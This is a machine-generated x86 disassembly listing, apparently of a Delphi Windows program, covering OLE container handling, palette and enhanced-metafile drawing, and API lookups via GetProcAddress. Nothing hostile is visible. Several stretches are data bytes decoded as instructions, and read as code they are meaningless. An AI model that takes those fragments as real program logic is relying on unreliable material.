mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
call sub_42a050
mov edx eax
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
push 0x0
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_42a0a8
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_473691
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
mov eax [ eax + 0xc ]
push eax
xor ecx ecx
xor edx edx
mov eax [ ebp - 0x18 ]
call sub_427900
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_473698
mov eax [ ebp - 0x18 ]
call sub_403390
retn
mov eax [ ebp - 0x8 ]
call sub_405b50
push eax
cmp [ ebp - 0x9 ] 0x1
cmc
sbb ecx ecx
mov edx r-xdata
lea eax [ ebp - 0x2c ]
call sub_473d1c
call sub_46f84c
mov edx [ ebp - 0x8 ]
mov edx [ edx ]
mov eax [ ebp - 0x4 ]
call sub_472d88
sub_473698
mov eax [ ebp - 0x10 ]
call sub_42b1f8
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x9 ] 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
call sub_403390
retn
sub_473750
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_40351c
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_41bc50
pop esi
pop ebx
retn
lea eax [ ebx + 0x28 ]
mov edx [ esi + 0x28 ]
call sub_405b68
pop esi
pop ebx
retn
sub_473788
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
cmp [ ebx + 0x28 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_427a5c
xor eax eax
push ebp
push sub_473886
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_427d50
mov edi eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x24 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x9 ] 0x0
cmp [ ebp - 0x8 ] 0x0
je r-xdata
lea eax [ ebp - 0xc ]
push eax
mov eax [ ebx + 0x28 ]
push eax
mov eax [ eax ]
call [ eax + 0x14 ]
cmp [ ebp - 0xc ] 0x4
jne r-xdata
push 0xffffffff
mov eax [ ebp - 0x8 ]
push eax
push edi
call SelectPalette
mov [ ebp - 0x8 ] eax
push edi
call RealizePalette
mov [ ebp - 0x9 ] 0x1
push esi
mov eax ebx
call sub_473938
neg eax
push eax
mov eax ebx
call sub_473954
push eax
mov eax ebx
call sub_473938
dec eax
push eax
push 0x0
mov eax [ esi + 0xc ]
sub eax [ esi + 0x4 ]
push eax
mov eax [ esi + 0x8 ]
sub eax [ esi ]
push eax
mov eax [ esi + 0x4 ]
push eax
mov eax [ esi ]
push eax
push edi
mov eax [ ebx + 0x28 ]
push eax
mov eax [ eax ]
call [ eax + 0x20 ]
call sub_46f84c
lea eax [ ebp - 0x10 ]
push eax
mov eax [ ebx + 0x28 ]
push eax
mov eax [ eax ]
call [ eax + 0xc ]
push esi
mov eax [ ebp - 0x10 ]
push eax
push edi
call PlayEnhMetaFile
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_427c48
retn
push 0xffffffff
mov eax [ ebp - 0x8 ]
push eax
push edi
call SelectPalette
cmp [ ebp - 0x9 ] 0x0
je r-xdata
sub_473894
push ebx
push ecx
mov ebx eax
cmp [ ebx + 0x28 ] 0x0
je r-xdata
mov al 0x1
pop edx
pop ebx
retn
push esp
mov eax [ ebx + 0x28 ]
push eax
mov eax [ eax ]
call [ eax + 0x14 ]
test eax eax
jne r-xdata
cmp [ esp ] 0x0
jle r-xdata
xor eax eax
pop edx
pop ebx
retn
sub_4738c0
push ebx
push esi
push edi
add esp 0xfffffff8
mov esi eax
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx edx
push 0x0
call GetDC
mov esi eax
push 0x3
push esi
call SetMapMode
mov eax [ esp ]
mov [ ebx ] eax
mov eax [ esp + 0x4 ]
mov [ ebx + 0x4 ] eax
neg [ ebx + 0x4 ]
push 0x1
push ebx
push esi
call LPtoDP
push esi
push 0x0
call ReleaseDC
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
sub_473908
push ebx
add esp 0xfffffff0
mov ebx eax
mov eax ebx
call sub_473938
mov edx eax
lea ecx [ esp + 0x8 ]
xor eax eax
call sub_419ff0
lea eax [ esp + 0x8 ]
mov edx esp
call sub_4738c0
mov eax [ esp + 0x4 ]
add esp 0x10
pop ebx
retn
sub_473938
push ecx
xor edx edx
mov [ esp ] edx
cmp [ eax + 0x28 ] 0x0
je r-xdata
mov eax [ esp ]
pop edx
retn
push esp
mov eax [ eax + 0x28 ]
push eax
mov eax [ eax ]
call [ eax + 0x1c ]
sub_473954
push ecx
xor edx edx
mov [ esp ] edx
cmp [ eax + 0x28 ] 0x0
je r-xdata
mov eax [ esp ]
pop edx
retn
push esp
mov eax [ eax + 0x28 ]
push eax
mov eax [ eax ]
call [ eax + 0x18 ]
sub_473970
push ecx
xor edx edx
cmp [ eax + 0x28 ] 0x0
je r-xdata
mov eax edx
pop edx
retn
push esp
mov eax [ eax + 0x28 ]
push eax
mov eax [ eax ]
call [ eax + 0x10 ]
mov edx [ esp ]
sub_47398c
push ecx
xor edx edx
cmp [ eax + 0x28 ] 0x0
je r-xdata
mov eax edx
pop edx
retn
push esp
mov eax [ eax + 0x28 ]
push eax
mov eax [ eax ]
call [ eax + 0x40 ]
test [ esp ] 0x2
setne dl
sub_4739ac
push ebx
add esp 0xfffffff0
mov ebx eax
mov eax ebx
call sub_473954
lea ecx [ esp + 0x8 ]
xor edx edx
call sub_419ff0
lea eax [ esp + 0x8 ]
mov edx esp
call sub_4738c0
mov eax [ esp ]
add esp 0x10
pop ebx
retn
sub_4739f0
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_473a2e
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_406030
mov eax [ ebp - 0x4 ]
call sub_4739d8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_473a35
lea eax [ ebp - 0x4 ]
call sub_404120
retn
sub_473a38
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x28 ] 0x0
je r-xdata
pop esi
pop ebx
retn
push esi
mov eax [ ebx + 0x28 ]
push eax
mov eax [ eax ]
call [ eax + 0x24 ]
call sub_46f84c
sub_473a58
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_473a96
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_406030
mov eax [ ebp - 0x4 ]
call sub_4739d8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_473a9d
lea eax [ ebp - 0x4 ]
call sub_404120
retn
sub_473aa4
push ebx
push esi
mov esi edx
mov ebx eax
push r-xdata
lea eax [ ebx + 0x28 ]
call sub_405b50
push eax
push 0x0
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_4245a0
test eax eax
je r-xdata
or ecx 0xffffffff
xor edx edx
call sub_473d44
call sub_46f84c
pop esi
pop ebx
retn
sub eax 0xffffffec
sub_473ae1
add [ eax ] al
add [ eax + 0x327bf809 ] al
mov edi 0xbb8b101a
add [ edx - 0x54f3d000 ] ch
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_473b5b
push [ fs : eax ]
mov [ fs : eax ] esp
push 0xffffffff
push 0x0
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_4245a0
test eax eax
je r-xdata
push eax
lea eax [ ebp - 0x4 ]
mov edx [ ebx + 0x28 ]
mov ecx r-xdata
call sub_405b94
mov eax [ ebp - 0x4 ]
push eax
mov eax [ eax ]
call [ eax + 0x18 ]
call sub_46f84c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_473b62
lea eax [ ebp - 0x4 ]
call sub_405b50
retn
sub eax 0xffffffec
sub_473b67
add [ ecx ] cl
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add al al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esi
push ebp
mov ebp esp
push 0x0
push ebx
xor eax eax
push ebp
push sub_473bb7
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_406030
mov eax [ ebp - 0x4 ]
call sub_4739d8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_473bbe
lea eax [ ebp - 0x4 ]
call sub_404120
retn
sub_473bc4
push ebp
mov ebp esp
push 0x0
push ebx
xor eax eax
push ebp
push sub_473c03
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_406030
mov eax [ ebp - 0x4 ]
call sub_4739d8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_473c0a
lea eax [ ebp - 0x4 ]
call sub_404120
retn
sub_473c10
cmp [ rw-data ] 0x0
jne r-xdata
retn
mov edx 0x8000
mov eax r-xdata
call sub_40d86c
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
sub_473d1c
push ebp
mov ebp esp
push ebx
cmp [ rw-data ] 0x0
je r-xdata
mov eax 0x8000ffff
mov ebx [ ebp + 0x8 ]
push ebx
push ecx
push edx
push eax
call [ rw-data ]
jmp r-xdata
pop ebx
pop ebp
retn 0x4
sub_473d44
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_405bc4
xor eax eax
push ebp
push sub_473da3
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
je r-xdata
mov ebx 0x8000ffff
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
push esi
push ebx
mov eax [ ebp - 0x4 ]
push eax
call [ rw-data ]
mov ebx eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_473daa
lea eax [ ebp - 0x4 ]
call sub_405b50
retn
sub_473db4
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_473e09
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_473e10
retn
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
push 0x0
push 0x0
push 0x10
mov eax [ rw-data ]
push eax
call SendMessageA
mov eax [ rw-data ]
push eax
call FreeLibrary
sub_473edc
pushfd
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + edi ] ah
inc edi
add [ eax + eax ] cl
add [ eax ] al
xor [ ecx ] dl
inc eax
add al bl
xor eax 0x35e40040
inc eax
add al ch
xor eax 0x35ec0040
inc eax
add al ah
xor eax 0x33280040
inc eax
add [ ebx + esi + 0x40 ] al
add [ eax + 0xe004033 ] al
push esp
inc ebp
jbe r-xdata
add [ esp + 0x4 ] 0xfffffdb0
mov eax [ esp + 0x4 ]
mov eax [ eax ]
jmp [ eax + 0xe0 ]
outsb
je r-xdata
add al 0xb4
std
imul esi [ ebx + 0x70 ] 0x68637461
nop
int3
sub_4744af
add [ eax ] al
add [ eax ] al
add al bl
inc ebp
inc edi
add [ eax + 0x46 ] ch
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] bl
inc esi
inc edi
add [ eax + 0x46 ] bl
inc edi
add [ eax + 0x2 ] ch
add [ eax ] al
insb
xor eax [ eax + eax + 0x18 ]
inc edx
inc edx
add ah ah
xor eax 0x3b6c0040
inc edx
add ah ch
xor eax 0x51d00040
inc edi
add [ eax ] ch
xor eax [ eax ]
inc esp
xor eax [ eax ]
or al 0x4b
inc edi
add [ edx + 0x52880044 ] bh
inc edi
add [ eax - 0x44 ] dl
inc ecx
add [ eax - 0x70 ] al
inc esp
add [ esp + 0x44 ] dl
add [ eax - 0x69 ] ah
inc esp
add al ch
pop ebx
inc edi
add [ eax ] dh
inc edx
inc edx
add [ eax ] bl
aas
inc edx
add [ eax ] dl
aas
inc edx
add [ eax + ebp * 2 + 0x48a00047 ] bl
inc edi
add al dl
fld [ eax + eax - 0x14 ]
loop r-xdata
add al bl
aad 0x44
add [ eax ] bh
loop r-xdata
verw [ ebx ]
mov al 0xd
mov al 0xc
mov al 0xe
mov al 0x5
mov al 0x29
mov al 0x2a
mov al 0xd1
call [ eax + 0x64 ]
inc edi
add [ eax + 0x64 ] dh
inc edi
add al ah
inc edi
add [ 0x65c00047 ] bh
inc edi
add [ esi + 0x47 ] cl
add [ edi + 0x47 ] cl
add [ eax + ebp * 2 ] al
inc edi
add [ eax + ebp * 2 + 0x47 ] dl
add [ eax + 0xb004759 ] dl
push esp
dec edi
insb
inc ebx
outsd
outsb
je r-xdata
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ edi ] al
add [ eax ] al
add [ eax * 4 + 0x2180041 ] ah
add [ eax ] al
cmp [ esi + 0x21c0041 ] al
add [ eax ] al
add al 0x86
inc ecx
add [ eax ] ah
add al [ eax ]
add ah dl
adc [ eax ] eax
and al 0x2
add [ eax ] al
je r-xdata
add [ esi + edx * 8 + 0x5b080044 ] dl
inc edi
add [ eax - 0x2a ] bh
inc esp
add al bl
xchg edi eax
inc esp
add [ esi + ebx * 4 + 0x44 ] ch
add [ esp + ebp * 4 ] cl
add al cl
bound eax [ eax + eax + 0x4c ]
fadd [ eax + eax + 0x6c ]
fadd [ eax + eax + 0x4c ]
aad 0x44
add [ eax ] dl
bound eax [ eax + eax + 0x14 ]
bound eax [ eax + eax + 0x10 ]
xchg edx eax
inc esp
add [ edx + edx * 4 ] bh
inc esp
add [ ebp + ebp * 2 + 0x44 ] dl
add [ ebx + 0x6ee00044 ] cl
inc esp
add al dl
pop esp
inc edi
add [ ecx + esi * 2 + 0x44 ] ch
add [ eax ] bl
jo r-xdata
retn
outsd
insb
push 0x7004746
or edx [ edi + ecx * 2 + 0x6c ]
inc ebx
outsd
outsb
je r-xdata
inc esp
add al bh
movsd [ edi ] [ esi ]
inc esp
add ah dh
test al 0x44
add [ ecx + edx * 2 ] ch
inc edi
add [ esp + ebp * 4 - 0x5357ffbc ] ah
inc esp
add ah dh
push ebx
inc edi
add [ eax ] cl
stosd [ edi ]
inc esp
add [ eax + 0x500044d7 ] bh
mov ch 0x44
inc ecx
add [ eax ] ch
add al [ eax ]
add ah cl
test [ ecx ] eax
sub al 0x2
add [ eax ] al
mov [ ebp + 0x2300041 ] es
add [ eax ] al
or al [ eax ]
adc al 0x0
add [ ecx + ebp * 8 - 0x2c03ffbc ] cl
inc esp
add [ edi + edx * 8 ] ah
inc esp
add [ eax + 0x47 ] ah
add [ eax + ebx * 2 + 0x2b900047 ] ch
inc eax
add [ ecx + ebx * 2 + 0x52600047 ] cl
inc edi
add al bl
outsd
inc edi
add al dh
jno r-xdata
add [ eax - 0x4b ] dl
inc esp
add [ eax + 0x62 ] ah
inc edi
add al al
xchg edx eax
inc esp
xor eax eax
push ebp
push sub_474735
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x8 ]
mov edx ebx
call sub_4138b4
mov edx [ ebp - 0x8 ]
lea eax [ ebp - 0x4 ]
mov ecx r-xdata
call sub_405b94
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_472c44
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47473c
lea eax [ ebp - 0x8 ]
call sub_405b50
lea eax [ ebp - 0x4 ]
call sub_405b50
retn
outsd
insb
hlt
sub_47468c
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx edx
xor edx edx
push ebp
push sub_4746ca
push [ fs : edx ]
mov [ fs : edx ] esp
lea edx [ ebp - 0x4 ]
call sub_472bf4
mov eax ebx
mov edx [ ebp - 0x4 ]
call sub_413d40
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4746d1
lea eax [ ebp - 0x4 ]
call sub_405b50
retn
sub_4746d8
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_474735
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x8 ]
mov edx ebx
call sub_4138b4
mov edx [ ebp - 0x8 ]
lea eax [ ebp - 0x4 ]
mov ecx r-xdata
call sub_405b94
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_472c44
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47473c
lea eax [ ebp - 0x8 ]
call sub_405b50
lea eax [ ebp - 0x4 ]
call sub_405b50
retn
sub_474754
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
call sub_40f624
mov eax esi
call sub_404f48
mov [ ebx + 0x8 ] eax
mov [ ebx ] 0x8
pop esi
pop ebx
retn
sub_474798
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x10 ]
mov esi [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
mov ecx edi
mov edx esi
mov eax ebx
call sub_403444
test al al
je r-xdata
mov eax [ ebx + 0x4 ]
mov eax [ eax + 0x208 ]
add eax 0x10
push eax
push esi
call IsEqualGUID
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax 0x80004002
mov ecx edi
mov edx r-xdata
mov eax ebx
call sub_403444
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
sub_4747ef
add [ eax ] al
add al 0x2
add [ eax ] al
add [ eax ] al
add al al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x4 ]
push eax
call sub_4768c4
pop ebp
retn 0x4
sub_474858
push ebp
mov ebp esp
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
cmp esi 0xfffffda1
jl r-xdata
mov ecx [ ebp + 0x1c ]
mov edx esi
mov eax [ edi + 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xcc ]
cmp esi 0xfffffda8
jg r-xdata
mov ecx [ ebp + 0x1c ]
mov edx esi
mov eax [ edi + 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc8 ]
jmp r-xdata
xor eax eax
pop edi
pop esi
pop ebx
pop ebp
retn 0x24
sub_4748a0
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_449498
or [ ebx + 0x24 ] 0x2
mov eax ebx
mov edx [ eax ]
call [ edx + 0xd0 ]
mov eax [ ebx + 0x208 ]
inc [ eax + 0x48 ]
mov eax [ ebx + 0x208 ]
cmp [ eax + 0x34 ] 0x0
jle r-xdata
add esp 0xfffffff0
call sub_4036f4
mov eax [ ebx + 0x208 ]
cmp [ eax + 0x3c ] 0x0
jle r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403360
mov esi eax
mov [ ebx + 0x240 ] esi
mov eax [ ebx + 0x208 ]
mov edx [ eax + 0x34 ]
mov eax esi
call sub_41b84c
mov eax [ ebx + 0x240 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_474774
mov [ ebx + 0x210 ] eax
mov eax ebx
call sub_474f14
mov edx [ ebx + 0x218 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xd4 ]
lea eax [ ebx + 0x23c ]
push eax
push 0x1
mov eax [ ebx + 0x218 ]
push eax
mov eax [ eax ]
call [ eax + 0x58 ]
call sub_46f84c
mov eax [ ebx + 0x208 ]
test [ eax + 0x44 ] 0x2
jne r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403360
mov esi eax
mov [ ebx + 0x244 ] esi
mov eax [ ebx + 0x208 ]
mov edx [ eax + 0x3c ]
mov eax esi
call sub_41b84c
mov eax [ ebx + 0x244 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
inc edi
xor esi esi
lea eax [ ebx + 0x21c ]
call sub_405b50
push eax
push r-xdata
mov eax [ ebx + 0x218 ]
push eax
mov eax [ eax ]
call [ eax ]
call sub_46f84c
test [ ebx + 0x23d ] 0x4
je r-xdata
test [ ebx + 0x23e ] 0x2
jne r-xdata
inc edi
xor esi esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_426c68
mov ecx eax
mov eax [ ebx + 0x240 ]
mov edx esi
call sub_41b7a0
inc esi
dec edi
jne r-xdata
test [ ebx + 0x23e ] 0x1
je r-xdata
xor edx edx
mov eax ebx
call sub_446ea4
mov eax ebx
test eax eax
je r-xdata
mov eax [ ebx + 0x208 ]
test [ eax + 0x44 ] 0x1
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_429b00
mov ecx eax
mov eax [ ebx + 0x244 ]
mov edx esi
call sub_41b7a0
mov eax [ ebx + 0x244 ]
mov edx esi
call sub_41b654
mov [ eax + 0x14 ] ebx
mov [ eax + 0x10 ] sub_4759e0
inc esi
dec edi
jne r-xdata
mov eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
mov eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
jmp r-xdata
push eax
mov eax [ ebx + 0x218 ]
push eax
mov eax [ eax ]
call [ eax + 0xc ]
call sub_46f84c
sub eax 0xfffffd9c
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_40374c
pop [ fs : 0x0 ]
add esp 0xc
test [ ebx + 0x23d ] 0x60
sete dl
mov eax ebx
call sub_44d9d8
push ebx
call sub_476950
call sub_46f84c
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
sub_474ad4
push ebx
push esi
push edi
mov esi eax
cmp [ esi ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ esi ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax [ esi ]
call sub_403390
xor eax eax
mov [ esi ] eax
inc ebx
xor edi edi
mov eax [ esi ]
mov edx edi
call sub_41b654
call sub_403390
inc edi
dec ebx
jne r-xdata
sub_474b0c
push ebx
push esi
call sub_40375c
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_475fb8
cmp [ esi + 0x218 ] 0x0
je r-xdata
mov eax esi
call sub_47532c
mov eax esi
call sub_4753d4
lea eax [ esi + 0x21c ]
call sub_405b50
cmp [ esi + 0x218 ] 0x0
je r-xdata
push 0x1
mov eax [ esi + 0x218 ]
push eax
mov eax [ eax ]
call [ eax + 0x18 ]
lea eax [ esi + 0x218 ]
call sub_405b50
mov eax [ esi + 0x210 ]
call sub_403390
lea eax [ esi + 0x240 ]
call sub_474ad4
lea eax [ esi + 0x244 ]
call sub_474ad4
mov eax [ esi + 0x208 ]
dec [ eax + 0x48 ]
mov eax [ esi + 0x208 ]
cmp [ eax + 0x48 ] 0x0
jne r-xdata
push 0x0
mov eax [ esi + 0x218 ]
push eax
mov eax [ eax ]
call [ eax + 0xc ]
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4495bc
test bl bl
jle r-xdata
mov eax esi
call sub_475394
pop esi
pop ebx
retn
mov eax esi
call sub_403744
sub_474bcc
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_474e6c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x220 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_474e73
lea eax [ ebp - 0xc ]
call sub_405b50
lea eax [ ebp - 0x8 ]
call sub_405b50
retn
xor eax eax
push ebp
push j_sub_403870#5
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push j_sub_403870#6
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0xc ]
call sub_405b50
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x218 ]
push eax
mov eax [ eax ]
call [ eax + 0x10 ]
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
test ebx ebx
jne r-xdata
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
cmp [ ebp - 0xc ] 0x0
jne r-xdata
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x218 ]
push eax
mov eax [ eax ]
call [ eax + 0xc ]
call sub_46f84c
sub eax 0xfffffd9c
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x214 ]
test ebx ebx
jne r-xdata
lea eax [ ebp - 0x8 ]
call sub_405b50
push eax
push 0x0
push ebx
call CreateStreamOnHGlobal
call sub_46f84c
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x21c ]
push eax
mov eax [ eax ]
call [ eax + 0x14 ]
call sub_46f84c
mov eax [ ebp - 0x4 ]
call sub_4753d4
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x21c ]
push eax
mov eax [ eax ]
call [ eax + 0x20 ]
call sub_46f84c
jmp r-xdata
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x218 ]
call sub_46fa58
mov eax [ ebp - 0x4 ]
add eax 0x238
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x210 ]
test ecx ecx
je r-xdata
sub ecx 0xfffffdb4
mov eax [ ebp - 0x4 ]
add eax 0x220
call sub_405b50
push eax
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x218 ]
push eax
mov eax [ eax ]
call [ eax ]
call sub_46f84c
mov eax [ ebp - 0x4 ]
add eax 0x224
call sub_405b50
push eax
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x218 ]
push eax
mov eax [ eax ]
call [ eax ]
call sub_46f84c
mov eax [ ebp - 0x4 ]
add eax 0x228
call sub_405b50
push eax
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x218 ]
push eax
mov eax [ eax ]
call [ eax ]
mov eax [ ebp - 0x4 ]
add eax 0x234
push eax
mov ecx [ ebp - 0x4 ]
test ecx ecx
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
lea edx [ eax + 0x10 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x218 ]
call sub_46fa58
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
test [ eax + 0x2c ] 0x1
je r-xdata
sub ecx 0xfffffff8
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
test [ eax + 0x2c ] 0x8
je r-xdata
push 0xfffffe0b
mov eax [ ebp - 0x4 ]
push eax
mov eax [ eax ]
call [ eax + 0xdc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
test [ eax + 0x2c ] 0x4
je r-xdata
push 0xfffffdfe
mov eax [ ebp - 0x4 ]
push eax
mov eax [ eax ]
call [ eax + 0xdc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
test [ eax + 0x2c ] 0x2
je r-xdata
push 0xfffffe00
mov eax [ ebp - 0x4 ]
push eax
mov eax [ eax ]
call [ eax + 0xdc ]
push 0xffffffff
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x220 ]
push eax
mov eax [ eax ]
call [ eax + 0x14 ]
mov eax [ ebp - 0x4 ]
push eax
call sub_476950
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
push 0xfffffdff
mov eax [ ebp - 0x4 ]
push eax
mov eax [ eax ]
call [ eax + 0xdc ]
sub_474ebc
push ebp
mov ebp esp
add esp 0xfffffef8
push ebx
mov ebx edx
cmp eax 0x80040112
jne r-xdata
call sub_46f84c
pop ebx
mov esp ebp
pop ebp
retn
lea edx [ ebp - 0x108 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax ]
call sub_4032e0
lea eax [ ebp - 0x108 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x4
lea eax [ ebp - 0x8 ]
push eax
push 0x0
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bc80
call sub_403b5c
sub_474f14
push ebp
